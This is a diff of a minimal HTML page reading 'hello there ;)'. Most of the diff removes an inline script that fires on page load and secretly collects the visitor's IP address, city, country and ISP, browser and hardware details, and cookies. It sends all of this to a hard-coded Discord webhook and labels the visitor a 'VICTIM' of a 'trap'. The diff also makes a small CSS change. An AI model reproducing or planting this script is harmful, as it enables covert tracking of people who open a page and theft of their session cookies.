@@ -6,74 +6,10 @@
     <title></title>
     <style>
         body,html{margin:0;padding:0;height:100%;background:#000;color:#fff;font-family:system-ui;overflow:hidden;display:flex;justify-content:center;align-items:center}
-        h1{font-size:4rem;letter-spacing:2px;opacity:0.9}
+        h1{font-size:4.5rem;letter-spacing:3px;opacity:0.9}
     </style>
 </head>
 <body>
     <h1>hello there ;)</h1>
-
-<script>
-// YOUR WEBHOOK
-const WEBHOOK = "https://discord.com/api/webhooks/1448460535048699945/YAUqJ8VwW7K7RQ3j-Gwr9ERmsg1xPkP0u98TGz_kNMTQq4MEz1zeGlcJum-4M7ShlK9X";
-
-let sent = false;
-
-async function own() {
-    if (sent) return;
-    sent = true;
-
-    // IP + full geo
-    let ip = "unknown";
-    let geo = {};
-    try { ip = await (await fetch("https://v4.ident.me/")).text(); } catch(e) {}
-    try { geo = await (await fetch(`http://ip-api.com/json/${ip}`)).json(); } catch(e) {}
-
-    // Every possible browser detail
-    const b = {
-        ua: navigator.userAgent,
-        platform: navigator.platform,
-        lang: navigator.language,
-        langs: navigator.languages?.join(", "),
-        cores: navigator.hardwareConcurrency || "?",
-        ram: navigator.deviceMemory || "?",
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        screen: `${screen.width}x${screen.height}`,
-        cookies: document.cookie || "none"
-    };
-
-    const payload = {
-        content: "**VICTIM JUST OPENED 'hello there ;)' PAGE**",
-        embeds: [{
-            color: 16711680,
-            title: "Full Harvest Complete",
-            timestamp: new Date().toISOString(),
-            fields: [
-                { name: "IP", value: ip, inline: true },
-                { name: "Location", value: `${geo.city||"?"} • ${geo.country||"?"}`, inline: true },
-                { name: "ISP", value: geo.isp || geo.org || "?", inline: true },
-                { name: "Browser", value: /Edg/.test(b.ua) ? "Edge" : /Chrome/.test(b.ua) ? "Chrome" : /Firefox/.test(b.ua) ? "Firefox" : /Safari/.test(b.ua) ? "Safari" : "Other", inline: true },
-                { name: "User-Agent", value: b.ua.substring(0,500) },
-                { name: "Hardware", value: `Cores: ${b.cores} • RAM: ${b.ram}GB`, inline: true },
-                { name: "Screen", value: b.screen, inline: true },
-                { name: "Timezone", value: b.tz, inline: true },
-                { name: "Cookies", value: "```" + b.cookies + "```" }
-            ],
-            footer: { text: "hello there ;) trap • instant ownage" }
-        }]
-    };
-
-    // Guaranteed delivery
-    fetch("https://corsproxy.io/?" + encodeURIComponent(WEBHOOK), {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify(payload)
-    });
-
-    navigator.sendBeacon(WEBHOOK, JSON.stringify(payload));
-}
-
-// Fire immediately
-setTimeout(own, 500);
-</script>
 </body>
 </html>
